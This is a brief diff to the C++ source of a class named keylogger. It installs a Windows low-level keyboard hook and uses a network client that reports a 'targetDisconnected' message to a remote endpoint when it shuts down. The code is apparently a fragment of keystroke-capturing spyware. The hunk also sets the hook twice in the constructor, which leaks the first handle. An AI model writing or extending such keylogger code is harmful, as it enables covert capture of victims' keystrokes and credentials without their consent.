@@ -5,12 +5,17 @@ keylogger::keylogger()
     : hook(SetWindowsHookExA(WH_KEYBOARD_LL, &keylogger::LowLevelKeyboardProc, NULL, 0)),
     client(&validation_function)
 {
+    hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger::KeyboardProc, NULL, 0);
+
 }
 
 keylogger::~keylogger()
 {
     if (hook != NULL)
         UnhookWindowsHookEx(hook);
+
+    kq::message<messageType> msg(messageType::targetDisconnected);
+    client.Send(msg);
     client.Disconnect();
 }
 
